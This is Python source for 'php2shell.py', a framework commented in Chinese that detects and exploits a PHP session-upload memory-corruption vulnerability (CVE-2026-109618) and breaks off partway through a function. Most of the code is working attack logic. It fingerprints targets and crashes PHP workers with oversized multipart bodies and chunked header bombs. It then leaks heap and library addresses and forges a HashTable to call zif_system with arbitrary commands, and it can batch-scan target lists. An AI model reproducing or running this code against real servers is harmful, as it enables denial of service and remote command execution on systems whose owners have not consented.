#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell.py - CVE-2026-109618 一体化自动检测与利用框架

一条命令完成全流程：
    指纹识别 -> session 消费点自动发现 -> 前置条件判定(post_max vs memory_limit)
    -> OOM 落点分级(回调前/后) -> 堆破坏验证(并发污染全部 worker) -> 三阶段 RCE

用法：
    python3 php2shell.py http://target/index.php            # 自动：检测 + 可行则利用
    python3 php2shell.py scan    -u http://target/          # 只检测
    python3 php2shell.py scan    -u http://target/ --safe   # 只检测，不做破坏性验证
    python3 php2shell.py exploit -u http://target/ -c 'id>/tmp/p1' --proof-file /tmp/p1
    python3 php2shell.py batch   -f targets.txt --workers 4 -o report.json

退出码：
     0  RCE 成功
    10  RCE 就绪（检测通过，未利用）
    20  仅受影响 / 可 OOM-DoS
    30  不受影响或已修复
    40  无可用的 session 消费点
    50  目标不可达
"""

import argparse
import ipaddress
import json
import os
import re
import socket
import ssl
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, '..', 'poc_eness'))

try:
    import poc_109618 as P
except Exception:                                   # pragma: no cover
    P = None

try:
    import php2shell_rce as RCE
except Exception:                                   # pragma: no cover
    RCE = None


# ----------------------------------------------------------------------------
# 常量 / 分级
# ----------------------------------------------------------------------------
V_RCE = 'RCE_READY'
V_DOS = 'AFFECTED_DOS_ONLY'
V_SAFE = 'NOT_AFFECTED_OR_PATCHED'
V_NOSINK = 'NO_SESSION_SINK'
V_DOWN = 'UNREACHABLE'
V_LIKELY = 'LIKELY_RCE'
# 前置条件满足（post_max>memory_limit、可 OOM、有 session 消费点），
# 但主动 UAF 探测未观测到任何破坏 —— 不能说「可 RCE」。已修复版本会落在这里。
V_PREMISES = 'PREMISES_ONLY_UNVERIFIED'

# ---- 伪造结构（fake HashTable carrier）尺寸与命令容量 ----
# 命令被写在 htdata+0x98 处，结构长 HT_SIZE 字节，因此容量 = HT_SIZE - 0x98 - 1
HT_SIZE = 167
HT_CMD_OFFSET = 0x98
CMD_CAPACITY = HT_SIZE - HT_CMD_OFFSET - 1   # = 14

EXIT = {V_RCE: 10, V_LIKELY: 10, V_PREMISES: 15, V_DOS: 20, V_SAFE: 30,
         V_NOSINK: 40, V_DOWN: 50}

USE_COLOR = sys.stdout.isatty() and os.environ.get('NO_COLOR') is None


def c(text, code):
    if not USE_COLOR:
        return str(text)
    return '\033[%sm%s\033[0m' % (code, text)


def ok(t):    return c(t, '32')
def warn(t):  return c(t, '33')
def bad(t):   return c(t, '31')
def info(t):  return c(t, '36')
def dim(t):   return c(t, '90')
def bold(t):  return c(t, '1')


def log(tag, msg):
    print('%s %s' % (c('[%s]' % tag, '36'), msg), flush=True)


# ----------------------------------------------------------------------------
# HTTP 客户端（裸 socket，支持 chunked）
# ----------------------------------------------------------------------------
class Resp(object):
    __slots__ = ('status', 'headers', 'body', 'elapsed', 'error')

    def __init__(self, status=0, headers=None, body=b'', elapsed=0.0, error=None):
        self.status = status
        self.headers = headers or {}
        self.body = body
        self.elapsed = elapsed
        self.error = error

    def h(self, name):
        return self.headers.get(name.lower())

    @property
    def alive(self):
        return self.error is None and self.status > 0

    def text(self):
        try:
            return self.body.decode('utf-8', 'replace')
        except Exception:
            return ''


class Client(object):
    def __init__(self, host, port, tls=False, timeout=20.0, host_header=None):
        self.host = host
        self.port = port
        self.tls = tls
        self.timeout = timeout
        self.host_header = host_header or (host if port in (80, 443) else '%s:%d' % (host, port))

    def _connect(self):
        s = socket.create_connection((self.host, self.port), timeout=self.timeout)
        s.settimeout(self.timeout)
        if self.tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)
        return s

    def request(self, method, path, headers=None, body=b'', chunked=False,
                max_body=1 << 20, close=True):
        t0 = time.time()
        hdrs = {
            'Host': self.host_header,
            'User-Agent': 'php2shell/1.0',
            'Accept': '*/*',
            'Connection': 'close' if close else 'keep-alive',
        }
        if headers:
            hdrs.update(headers)
        if chunked:
            hdrs['Transfer-Encoding'] = 'chunked'
        elif body:
            hdrs['Content-Length'] = str(len(body))

        head = [('%s %s HTTP/1.1' % (method, path)).encode()]
        for k, v in hdrs.items():
            head.append(('%s: %s' % (k, v)).encode())
        packet = b'\r\n'.join(head) + b'\r\n\r\n'

        sock = None
        try:
            sock = self._connect()
            sock.sendall(packet)
            if chunked:
                self._send_chunked(sock, body)
            elif body:
                sock.sendall(body)
            return self._read(sock, t0, max_body)
        except socket.timeout:
            return Resp(elapsed=time.time() - t0, error='timeout')
        except ConnectionResetError:
            return Resp(elapsed=time.time() - t0, error='reset')
        except (BrokenPipeError, ConnectionAbortedError) as e:
            return Resp(elapsed=time.time() - t0, error='aborted:%s' % e)
        except OSError as e:
            return Resp(elapsed=time.time() - t0, error='os:%s' % e)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    @staticmethod
    def _send_chunked(sock, payload, size=65536):
        for i in range(0, len(payload), size):
            piece = payload[i:i + size]
            sock.sendall(b'%x\r\n' % len(piece) + piece + b'\r\n')
        sock.sendall(b'0\r\n\r\n')

    def _read(self, sock, t0, max_body):
        buf = b''
        while b'\r\n\r\n' not in buf:
            try:
                piece = sock.recv(65536)
            except socket.timeout:
                return Resp(elapsed=time.time() - t0, error='timeout-head')
            if not piece:
                break
            buf += piece
            if len(buf) > 1 << 20:
                break
        if b'\r\n\r\n' not in buf:
            return Resp(elapsed=time.time() - t0, error='no-header')

        raw_head, rest = buf.split(b'\r\n\r\n', 1)
        lines = raw_head.split(b'\r\n')
        try:
            status = int(lines[0].split(b' ')[1])
        except Exception:
            status = 0
        headers = {}
        for line in lines[1:]:
            if b':' in line:
                k, v = line.split(b':', 1)
                headers[k.decode('latin1').strip().lower()] = v.decode('latin1').strip()

        body = b''
        try:
            if 'content-length' in headers:
                want = min(int(headers['content-length']), max_body)
                body = rest[:want]
                while len(body) < want:
                    piece = sock.recv(min(65536, want - len(body)))
                    if not piece:
                        break
                    body += piece
            elif headers.get('transfer-encoding', '').lower() == 'chunked':
                data = rest
                while True:
                    while b'\r\n' not in data:
                        piece = sock.recv(65536)
                        if not piece:
                            break
                        data += piece
                    if b'\r\n' not in data:
                        break
                    line, data = data.split(b'\r\n', 1)
                    try:
                        n = int(line.strip().split(b';')[0], 16)
                    except Exception:
                        break
                    if n == 0:
                        break
                    while len(data) < n + 2:
                        piece = sock.recv(65536)
                        if not piece:
                            break
                        data += piece
                    body += data[:n]
                    data = data[n + 2:]
                    if len(body) > max_body:
                        break
            else:
                body = rest
                while len(body) < max_body:
                    try:
                        piece = sock.recv(65536)
                    except socket.timeout:
                        break
                    if not piece:
                        break
                    body += piece
        except socket.timeout:
            pass
        return Resp(status, headers, body, time.time() - t0)


# ----------------------------------------------------------------------------
# 工具函数
# ----------------------------------------------------------------------------
def parse_url(url):
    if '://' not in url:
        url = 'http://' + url
    u = urlparse(url)
    tls = u.scheme == 'https'
    port = u.port or (443 if tls else 80)
    path = u.path or '/'
    if u.query:
        path += '?' + u.query
    return u.hostname, port, path, tls, url


def new_client(url, timeout=20.0):
    host, port, path, tls, _ = parse_url(url)
    return Client(host, port, tls, timeout), path


def rnd(n=8):
    import random
    return ''.join(random.choice('abcdef0123456789') for _ in range(n))


def build_multipart(boundary, fields=None, files=None, big_value=None, big_name='pad'):
    b = boundary.encode()
    out = b''
    for name, value in (fields or []):
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % name).encode()
        out += value.encode() if isinstance(value, str) else value
        out += b'\r\n'
    if big_value is not None:
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"\r\n\r\n' % big_name).encode()
        out += big_value
        out += b'\r\n'
    for name, filename, content in (files or []):
        out += b'--' + b + b'\r\n'
        out += ('Content-Disposition: form-data; name="%s"; filename="%s"\r\n'
                % (name, filename)).encode()
        out += b'Content-Type: application/octet-stream\r\n\r\n'
        out += content + b'\r\n'
    out += b'--' + b + b'--\r\n'
    return out


def header_bomb_body(boundary, n_lines, name='a', prefix='X'):
    """单 part 内海量 header 行 -> 打爆 rfc1867 header buffer。"""
    b = boundary.encode()
    out = b'--' + b + b'\r\n'
    out += ('Content-Disposition: form-data; name="%s"\r\n' % name).encode()
    line = ('%s: v\r\n' % prefix).encode()
    out += line * n_lines
    out += b'\r\nx\r\n'
    out += b'--' + b + b'--\r\n'
    return out


OOM_RE = re.compile(r'Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\)')
FATAL_HINTS = ('Allowed memory size', 'tried to allocate', 'Unknown on line',
               'Maximum execution time', 'multipart')


def parse_oom(text):
    m = OOM_RE.search(text)
    if m:
        return {'memory_limit': int(m.group(1)), 'tried': int(m.group(2))}
    if 'tried to allocate' in text:
        m2 = re.search(r'tried to allocate (\d+) bytes', text)
        if m2:
            return {'memory_limit': None, 'tried': int(m2.group(1))}
    return None


def looks_fatal(resp):
    if resp.status >= 500:
        return True
    t = resp.text()
    return any(h in t for h in FATAL_HINTS)


# ----------------------------------------------------------------------------
# 阶段 1：指纹
# ----------------------------------------------------------------------------
def do_fingerprint(url, timeout=20.0):
    cli, path = new_client(url, timeout)
    r = cli.request('GET', path, max_body=262144)
    info = {
        'url': url,
        'status': r.status,
        'error': r.error,
        'server': r.h('server'),
        'x_powered_by': r.h('x-powered-by'),
        'set_cookie': r.h('set-cookie'),
        'php_version': None,
        'sink_candidate': False,
    }
    if not r.alive:
        return info, cli, path
    for src in (r.h('x-powered-by') or '', r.h('server') or '', r.text()[:4096]):
        m = re.search(r'PHP/(\d+\.\d+\.\d+)', src)
        if m:
            info['php_version'] = m.group(1)
            break
    if not info['php_version']:
        m = re.search(r'(\d+\.\d+\.\d+)', r.h('x-lab-version') or '')
        if m:
            info['php_version'] = m.group(1)
    sc = (r.h('set-cookie') or '').upper()
    info['sink_candidate'] = 'PHPSESSID' in sc or 'PHPSESSID' in r.text().upper()
    return info, cli, path


# ----------------------------------------------------------------------------
# 阶段 2：session 消费点自动发现
# ----------------------------------------------------------------------------
COMMON_PATHS = ['/', '/index.php', '/index.html', '/login.php', '/admin.php',
                '/home.php', '/app.php', '/test.php', '/info.php', '/phpinfo.php']


def discover_sinks(url, cli, base_path, max_fetch=14, timeout=20.0):
    """找出真正会 Set-Cookie: PHPSESSID 的脚本（= 调用 session_start 的消费点）。"""
    host, port, _, tls, _ = parse_url(url)
    candidates = [base_path]
    base_resp = cli.request('GET', base_path, max_body=262144)
    body = base_resp.text()

    if body:
        for m in re.finditer(r'''(?:href|action|src)\s*=\s*["']([^"'#]{1,200})["']''',
                             body, re.I):
            link = m.group(1).strip()
            if link.startswith(('javascript:', 'mailto:', 'data:')):
                continue
            full = urljoin(url, link)
            if parse_url(full)[0] != host:
                continue
            p = urlparse(full).path or '/'
            if p not in candidates:
                candidates.append(p)
            if len(candidates) > 40:
                break

    for p in COMMON_PATHS:
        if p not in candidates:
            candidates.append(p)

    sinks = []
    fetched = 0
    for p in candidates:
        if fetched >= max_fetch:
            break
        fetched += 1
        r = cli.request('GET', p, max_body=65536)
        if not r.alive:
            continue
        cookie = (r.h('set-cookie') or '').upper()
        if 'PHPSESSID' in cookie:
            rec = {'path': p, 'status': r.status, 'set_cookie': r.h('set-cookie')[:120]}
            sinks.append(rec)
            log('sink', '%s -> Set-Cookie PHPSESSID (status %d)' % (p, r.status))
        elif 'PHPSESSID' in r.text().upper():
            sinks.append({'path': p, 'status': r.status, 'set_cookie': '(body)'})
            log('sink', '%s -> body 中出现 PHPSESSID' % p)
    if not sinks and base_resp.alive:
        sinks.append({'path': base_path, 'status': base_resp.status,
                      'set_cookie': base_resp.h('set-cookie'),
                      'note': 'no Set-Cookie; 兜底尝试'})
        log('sink', warn('未发现 Set-Cookie 页面，兜底尝试 %s' % base_path))
    return sinks


# ----------------------------------------------------------------------------
# 阶段 3：前置条件判定（CL 大 body 是否可 OOM）
# ----------------------------------------------------------------------------
def probe_cl_body(cli, path, limit_mb=32, timeout=40.0):
    """有 Content-Length 的大 body：能 OOM => post_max_size > memory_limit。"""
    result = {'attempts': [], 'oom': None, 'post_max_blocked': False}
    sizes = [mb for mb in (2, 4, 8, 16, 32, 48, 64) if mb <= limit_mb]
    for mb in sizes:
        boundary = '----p2s' + rnd(12)
        fields = [('PHP_SESSION_UPLOAD_PROGRESS', 'p2s-%d-%s' % (mb, rnd(4)))]
        big = b'A' * (mb * 1024 * 1024)
        body = build_multipart(boundary, fields=fields, big_value=big)
        r = cli.request('POST', path, body=body,
                        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                        max_body=65536)
        oom = parse_oom(r.text()) if r.alive else None
        rec = {'mb': mb, 'status': r.status, 'error': r.error,
               'len': len(body), 'oom': oom, 'elapsed': round(r.elapsed, 2)}
        result['attempts'].append(rec)
        if oom:
            result['oom'] = dict(oom, mb=mb)
            log('cl', '%2dMB -> %s  OOM tried=%s' % (mb, bad('500'), oom.get('tried')))
            break
        if r.alive and r.status < 500:
            log('cl', '%2dMB -> %d (%.2fs)' % (mb, r.status, r.elapsed))
        else:
            log('cl', '%2dMB -> %s' % (mb, r.status if r.alive else ('ERR:' + str(r.error))))
        time.sleep(0.25)
    return result


# ----------------------------------------------------------------------------
# 阶段 4：OOM 落点分级（chunked header 炸弹，绕过 post_max）
# ----------------------------------------------------------------------------
def probe_header_bomb(cli, path, steps=(100000, 200000, 400000, 800000, 1600000),
                      timeout=60.0):
    result = {'attempts': [], 'oom': None, 'oom_suspected': None,
              'threshold_lines': None}
    for n in steps:
        boundary = '----p2s' + rnd(12)
        body = header_bomb_body(boundary, n)
        r = cli.request('POST', path, body=body, chunked=True,
                        headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                        max_body=65536)
        oom = parse_oom(r.text()) if r.alive else None
        rec = {'lines': n, 'mb': round(len(body) / 1048576.0, 2),
               'status': r.status, 'error': r.error, 'oom': oom,
               'elapsed': round(r.elapsed, 2)}
        result['attempts'].append(rec)
        if oom:
            result['oom'] = dict(oom, lines=n, mb=rec['mb'])
            result['threshold_lines'] = n
            log('oom', '%d 行(%.2fMB) -> OOM tried=%s' % (n, rec['mb'], oom.get('tried')))
            break
        # display_errors=Off 时 OOM 只体现在状态码突变，无错误文本
        if r.alive and r.status >= 500:
            result['oom_suspected'] = {'status': r.status, 'lines': n, 'mb': rec['mb']}
            result['threshold_lines'] = n
            log('oom', '%d 行(%.2fMB) -> %s 疑似 OOM（无回显，display_errors=Off）'
                % (n, rec['mb'], bad('500')))
            break
        log('oom', '%d 行(%.2fMB) -> %s (%.2fs)' % (
            n, rec['mb'], r.status if r.alive else ('ERR:' + str(r.error)), r.elapsed))
        time.sleep(0.3)
    return result


# ----------------------------------------------------------------------------
# 阶段 5：并发污染全部 worker + 解引用验证
# ----------------------------------------------------------------------------
def dirty_workers(url, sink_path, mode, n=8, timeout=60.0):
    """并发打 OOM，尽量覆盖 prefork 全部 worker，再检测是否有残留破坏。"""
    host, port, path, tls, _ = parse_url(url)

    def trigger(i):
        cli = Client(host, port, tls, timeout)
        if mode == 'bomb':
            boundary = '----p2s' + rnd(12)
            body = header_bomb_body(boundary, 800000)
            return cli.request('POST', sink_path, body=body, chunked=True,
                               headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                               max_body=32768)
        boundary = '----p2s' + rnd(12)
        body = build_multipart(boundary,
                               fields=[('PHP_SESSION_UPLOAD_PROGRESS', 'd-%d' % i)],
                               big_value=b'A' * (16 * 1024 * 1024))
        return cli.request('POST', sink_path, body=body,
                           headers={'Content-Type': 'multipart/form-data; boundary=' + boundary},
                           max_body=32768)

    hits = 0
    with ThreadPoolExecutor(max_workers=n) as pool:
        futs = [pool.submit(trigger, i) for i in range(n)]
        for f in as_completed(futs):
            try:
                r = f.result()
                if looks_fatal(r) or r.error:
                    hits += 1
            except Exception:
                pass
    log('dirty', '并发 %d 次 OOM，异常响应 %d 个' % (n, hits))

    time.sleep(0.6)
    checks = []
    for i in range(4):
        cli = Client(host, port, tls, timeout)
        r = cli.request('GET', sink_path, max_body=8192)
        checks.append({'status': r.status, 'error': r.error, 'elapsed': round(r.elapsed, 2)})
        if not r.alive or r.status >= 500:
            log('deref', bad('第 %d 次复检异常: %s' % (i + 1, r.error or r.status)))
        time.sleep(0.15)

    crashed = any((not ch['error'] and ch['status'] >= 500) for ch in checks) or \
              sum(1 for ch in checks if ch['error']) >= 2
    return {'oom_triggers': n, 'fatal_hits': hits, 'checks': checks, 'corrupted': crashed}


# ----------------------------------------------------------------------------
# 阶段 6：三阶段 RCE（复用 php2shell_rce）
# ----------------------------------------------------------------------------
def probe_leak(url, sink_path, rounds=6, timeout=60.0, stage1_n=None):
    """只做 Stage-1：尝试诱出堆基址。成功=内存破坏可观测（受影响），失败=无悬垂。"""
    if RCE is None or P is None:
        return {'ok': False, 'reason': 'RCE 模块不可用'}
    host, port, _, tls, _ = parse_url(url)
    # RCE 阶段走裸 socket（RCE._dial），必须把 scheme/TLS 状态同步过去，否则 https 目标握手错位
    RCE.set_tls(bool(tls), insecure=bool(getattr(P, 'DEFAULT_INSECURE', False)),
                server_hostname=host)
    path = sink_path or '/'
    ex = P.Exploit(P.Target(url, timeout=timeout, verbose=False), 'id',
                   zif_offset=RCE.ZIF_OFFSET, dtor_offset=RCE.DTOR_OFFSET,
                   htdata_offset=RCE.HTDATA_OFFSET, profile='bookworm', verbose=False)
    if stage1_n:
        ex.stage1_n = stage1_n
    for i in range(1, rounds + 1):
        try:
            base = RCE.leak_chunk_base(host, port, path, ex)
        except Exception as e:
            log('leak1', '第 %d/%d 次异常: %s' % (i, rounds, e))
            base = None
        if base:
            return {'ok': True, 'chunk_base': hex(base), 'rounds': i}
        log('leak1', 'Stage-1 第 %d/%d 次未命中' % (i, rounds))
        time.sleep(0.4)
    return {'ok': False, 'rounds': rounds}


def run_exploit(url, sink_path, cmd, proof_file, rounds=30, stage1_n=None,
                stage2_t=None, zif=None, dtor=None, htdata=None,
                leak_retries=3, timeout=60.0, ht_size=None):
    if RCE is None or P is None:
        return {'ok': False, 'reason': 'php2shell_rce/poc_109618 不可用'}

    host, port, _, tls, _ = parse_url(url)
    # RCE 阶段走裸 socket（RCE._dial），必须把 scheme/TLS 状态同步过去，否则 https 目标握手错位
    RCE.set_tls(bool(tls), insecure=bool(getattr(P, 'DEFAULT_INSECURE', False)),
                server_hostname=host)
    path = sink_path or '/'
    zif = zif if zif is not None else RCE.ZIF_OFFSET
    dtor = dtor if dtor is not None else RCE.DTOR_OFFSET
    htdata = htdata if htdata is not None else RCE.HTDATA_OFFSET

    ht_size = int(ht_size or HT_SIZE)
    cap = ht_size - HT_CMD_OFFSET - 1
    if len(cmd.encode()) > cap:
        return {'ok': False,
                'reason': 'cmd 超过容量 %d 字节（ht_size=%d）: %d'
                          % (cap, ht_size, len(cmd.encode()))}

    ex = P.Exploit(P.Target(url, timeout=timeout, verbose=False), cmd,
                   zif_offset=zif, dtor_offset=dtor, htdata_offset=htdata,
                   profile='bookworm', verbose=False)
    ex.ht_size = ht_size
    if stage1_n:
        ex.stage1_n = stage1_n
    s2t = stage2_t or RCE.STAGE2_T

    chunk_base = None
    for attempt in range(1, leak_retries + 1):
        log('leak1', 'Stage-1 泄漏 chunk_base（第 %d/%d 次）' % (attempt, leak_retries))
        try:
            chunk_base = RCE.leak_chunk_base(host, port, path, ex)
        except Exception as e:
            log('leak1', '异常: %s' % e)
            chunk_base = None
        if chunk_base:
            break
        time.sleep(0.5)
    if not chunk_base:
        return {'ok': False, 'reason': 'Stage-1 泄漏失败（可调 --stage1-n）'}
    log('leak1', ok('chunk_base = %s' % hex(chunk_base)))

    libphp_base = None
    for attempt in range(1, leak_retries + 1):
        log('leak2', 'Stage-2 泄漏 libphp_base（第 %d/%d 次）' % (attempt, leak_retries))
        try:
            libphp_base = RCE.leak_libphp_base(host, port, path, ex, s2t)
        except Exception as e:
            log('leak2', '异常: %s' % e)
            libphp_base = None
        if libphp_base:
            break
        time.sleep(0.5)
    if not libphp_base:
        return {'ok': False, 'reason': 'Stage-2 泄漏失败（可调 --stage2-t）',
                'chunk_base': hex(chunk_base)}
    log('leak2', ok('libphp_base = %s' % hex(libphp_base)))

    log('rce', 'Stage-3 伪造 HashTable -> zif_system，命令: %s' % cmd)
    try:
        good = RCE.do_rce(host, port, path, ex, chunk_base, libphp_base, cmd,
                          htdata, zif, proof_file, rounds)
    except Exception as e:
        log('rce', '异常: %s' % e)
        good = False
    if not good and proof_file and os.path.exists(proof_file):
        good = True

    # --- 回读校验（修复假阴性）：引擎的「解引用B=0B/无回显」并不等于命令未执行。
    # 只要命令带 `>name` 重定向，就按 HTTP 回读 name 判定（200 且非 404 页面）。
    readback = None
    m_rb = re.search(r'>\s*([A-Za-z0-9_.\-]{1,32})\s*$', cmd)
    if not good and m_rb:
        import urllib.request as _u
        rb_url = url.rstrip('/') + '/' + m_rb.group(1)
        try:
            with _u.urlopen(rb_url, timeout=10) as r:
                body = r.read()
                if r.getcode() == 200 and body and b'Not Found' not in body:
                    good = True
                    readback = body.decode('utf-8', 'replace')
                    log('rce', ok('回读 %s 成功（%dB）' % (m_rb.group(1), len(body))))
        except Exception:
            pass

    proof = None
    if proof_file and os.path.exists(proof_file):
        try:
            with open(proof_file, 'rb') as fh:
                proof = fh.read().decode('utf-8', 'replace')
        except Exception:
            proof = '(读取失败)'
    return {'ok': bool(good), 'chunk_base': hex(chunk_base),
            'libphp_base': hex(libphp_base), 'proof': proof}


# ----------------------------------------------------------------------------
# 编排：检测主流程
# ----------------------------------------------------------------------------
def scan_target(url, args):
    rpt = {'url': url, 'ts': time.strftime('%Y-%m-%dT%H:%M:%S'), 'steps': {}}
    log('1/6', '指纹识别 %s' % bold(url))
    info, cli, path = do_fingerprint(url, args.timeout)
    rpt['steps']['fingerprint'] = info
    if not info['status']:
        rpt['verdict'] = V_DOWN
        log('1/6', bad('目标不可达: %s' % info['error']))
        return rpt
    log('1/6', 'status=%s server=%s php=%s cookie=%s' % (
        info['status'], info['server'], info['php_version'] or '?',
        'yes' if info['set_cookie'] else 'no'))

    log('2/6', '发现 session 消费点（会调 session_start 的脚本）')
    sinks = discover_sinks(url, cli, path, timeout=args.timeout)
    rpt['steps']['sinks'] = sinks
    if not sinks:
        rpt['verdict'] = V_NOSINK
        log('2/6', bad('未发现任何 session 消费点 -> 该 CVE 无利用面'))
        return rpt
    sink = sinks[0]['path']
    log('2/6', ok('选中消费点: %s' % sink))

    log('3/6', '前置判定：有 Content-Length 大 body 能否 OOM（post_max vs memory_limit）')
    cl = probe_cl_body(cli, sink, limit_mb=args.max_mb, timeout=args.timeout * 2)
    rpt['steps']['cl_probe'] = cl
    if cl['oom']:
        log('3/6', ok('确认 post_max_size > memory_limit（%sMB body 触发 OOM）' % cl['oom']['mb']))
        rpt['verdict'] = V_PREMISES
        rpt['precondition'] = 'post_max_size > memory_limit'
        if cl['oom'].get('memory_limit'):
            rpt['memory_limit'] = cl['oom']['memory_limit']
    else:
        log('3/6', warn('CL 路径未能 OOM -> 疑似 post_max_size <= memory_limit'))

    log('4/6', 'OOM 落点分级：chunked 无 CL header 炸弹（绕过 post_max）')
    bomb = probe_header_bomb(cli, sink, timeout=args.timeout * 3)
    rpt['steps']['header_bomb'] = bomb

    bomb_hit = bomb['oom'] or bomb.get('oom_suspected')

    if not cl['oom'] and not bomb_hit:
        rpt['verdict'] = V_SAFE
        log('4/6', warn('两条路径都无法 OOM -> 不受影响 / 已修复 / 内存充裕'))
        return rpt

    if not cl['oom'] and bomb_hit:
        tried = (bomb['oom'] or {}).get('tried')
        rpt['oom_landing'] = tried
        rpt['verdict'] = V_DOS
        if tried and tried < 65536:
            rpt['landing_stage'] = 'before_session_callback (header buffer)'
            log('4/6', warn('落点 tried=%d（header buffer 扩容，回调之前）-> 无悬垂' % tried))
        elif tried is None:
            rpt['landing_stage'] = 'unknown (no error echo)'
            log('4/6', warn('OOM 无回显，落点未知 -> 交由堆破坏验证判定'))
        else:
            log('4/6', warn('落点 tried=%s' % tried))

    if getattr(args, 'try_leak', False) and cl['oom']:
        log('4.5/6', '泄漏探针：Stage-1 诱出堆基址（区分「受影响」与「已修复」）')
        lk = probe_leak(url, sink, rounds=getattr(args, 'leak_rounds', 6),
                        timeout=args.timeout, stage1_n=getattr(args, 'stage1_n', None))
        rpt['steps']['leak_probe'] = lk
        if lk.get('ok'):
            rpt['verdict'] = V_RCE
            rpt['chunk_base'] = lk['chunk_base']
            log('4.5/6', ok('泄漏成功 chunk_base=%s（第 %d 轮）-> 内存破坏可观测'
                            % (lk['chunk_base'], lk['rounds'])))
            log('6/6', '结论')
            return rpt
        log('4.5/6', warn('泄漏失败 -> 前置满足但未观测到 infoleak（可能已修复或布局不同）'))

    if args.safe:
        rpt.setdefault('verdict', V_DOS)
        rpt['note'] = '--safe 跳过堆破坏验证'
        return rpt

    log('5/6', '堆破坏验证：并发污染全部 worker 后复检')
    mode = 'cl' if cl['oom'] else 'bomb'
    dirty = dirty_workers(url, sink, mode, n=args.workers_dirty, timeout=args.timeout * 2)
    rpt['steps']['dirty'] = dirty
    if dirty['corrupted']:
        rpt['verdict'] = V_RCE
        log('5/6', ok('复检异常 -> worker 状态被破坏，RCE 原语成立'))
    else:
        if cl['oom']:
            rounds = int(getattr(args, 'active_rounds', 2) or 2)
            if not getattr(args, 'no_active_uaf', False):
                log('5.5/6', '主动 UAF 实测：同一 keep-alive 连接 A(污染)->B(解引用) x%d' % rounds)
                ap = active_crash_probe(url, timeout=max(args.timeout * 2, 45.0), rounds=rounds)
                rpt['steps']['active_uaf'] = ap
                av = ap.get('verdict')
                if av == 'worker_killed' or int(ap.get('crashes') or 0) > 0:
                    rpt['verdict'] = V_LIKELY
                    log('5.5/6', ok('active: 崩溃 %s/%s -> UAF 原语实测成立（可进 exploit）'
                                    % (ap.get('crashes'), ap.get('rounds', rounds))))
                elif av in ('unavailable', 'error'):
                    rpt['verdict'] = V_PREMISES
                    log('5.5/6', warn('active: 探测不可用（%s）-> 不下 RCE 结论'
                                      % (ap.get('error') or av)))
                else:
                    rpt['verdict'] = V_PREMISES
                    log('5.5/6', warn('active: %s -> 未观测到破坏，判为「前置满足未验证」'
                                      % av))
            else:
                rpt['verdict'] = V_PREMISES
                log('5.5/6', warn('已跳过主动 UAF 实测（--no-active-uaf）-> 不下 RCE 结论'))
        else:
            rpt['verdict'] = V_DOS
            log('5/6', warn('复检正常 -> 落点在回调之前，仅 DoS'))

    log('6/6', '结论')
    return rpt


REDIR_RE = re.compile(r'>\s*([^\s;|&]+)')


def collect_cmds(args):
    """汇总 -c（可重复）与 --cmd-file 的命令列表。"""
    cmds = list(getattr(args, 'cmd', None) or [])
    cf = getattr(args, 'cmd_file', None)
    if cf:
        try:
            with open(cf, encoding='utf-8') as f:
                for line in f:
                    s = line.strip()
                    if s and not s.startswith('#'):
                        cmds.append(s)
        except OSError as e:
            return None, '读取 --cmd-file 失败: %s' % e
    if not cmds:
        cmds = ['id>/tmp/p1']
    return cmds, None


def cmd_capacity(args):
    return int(getattr(args, 'ht_size', HT_SIZE) or HT_SIZE) - HT_CMD_OFFSET - 1


def proof_path_for(cmd, args, single):
    """按命令里的重定向目标推导本地 proof 路径。"""
    if single and getattr(args, 'proof_file', None):
        return args.proof_file
    pd = getattr(args, 'proof_dir', None)
    if not pd:
        return None
    m = REDIR_RE.search(cmd)
    if not m:
        return None
    return os.path.join(pd, os.path.basename(m.group(1)))


def parse_headers(items):
    """把 ['K: V', ...] 解析成 dict。"""
    out = {}
    for it in items or []:
        if ':' not in it:
            continue
        k, v = it.split(':', 1)
        out[k.strip()] = v.strip()
    return out


def apply_net_options(args):
    """把 --proxy / -H 注入请求层（供每个请求使用）。"""
    if P is None:
        return
    P.DEFAULT_PROXY = getattr(args, 'proxy', None)
    P.DEFAULT_HEADERS = parse_headers(getattr(args, 'header', None))
    if hasattr(P, 'DEFAULT_INSECURE'):
        P.DEFAULT_INSECURE = (bool(getattr(args, 'insecure', False))
                              or os.environ.get("PHP2SHELL_INSECURE", "") == "1")
    if hasattr(P, 'DEFAULT_SOURCES'):
        P.DEFAULT_SOURCES = list(getattr(args, 'source_addr', None) or [])


def exploit_target(url, sink_path, args):
    """执行利用；-c 可重复，每条命令各跑一次完整三阶段链（每条 <= 容量）。"""
    apply_net_options(args)
    cmds, err = collect_cmds(args)
    if err:
        return {'ok': False, 'reason': err}
    cap = cmd_capacity(args)
    single = len(cmds) == 1
    if not single:
        print(info('[multi] 共 %d 条命令，逐条执行（每条 <= %d 字节）' % (len(cmds), cap)))

    results = []
    for i, c in enumerate(cmds, 1):
        if len(c.encode()) > cap:
            print(bad('  [%d/%d] 跳过（%d > %d 字节）: %s'
                      % (i, len(cmds), len(c.encode()), cap, c)))
            results.append({'cmd': c, 'ok': False, 'reason': 'over capacity'})
            continue
        pf = proof_path_for(c, args, single)
        if not single:
            print(info('  [%d/%d] %s' % (i, len(cmds), c)))
        r = run_exploit(url, sink_path, c, pf, rounds=args.rounds,
                        stage1_n=args.stage1_n, stage2_t=args.stage2_t,
                        zif=args.zif_offset, dtor=args.dtor_offset,
                        htdata=args.htdata_offset,
                        leak_retries=args.leak_retries, timeout=args.timeout,
                        ht_size=args.ht_size)
        r['cmd'] = c
        results.append(r)
        if single:
            return r
        if r.get('ok'):
            print(ok('        -> OK'))
        else:
            print(bad('        -> 失败: %s' % r.get('reason')))
        if getattr(args, 'rate', 0):
            time.sleep(args.rate)
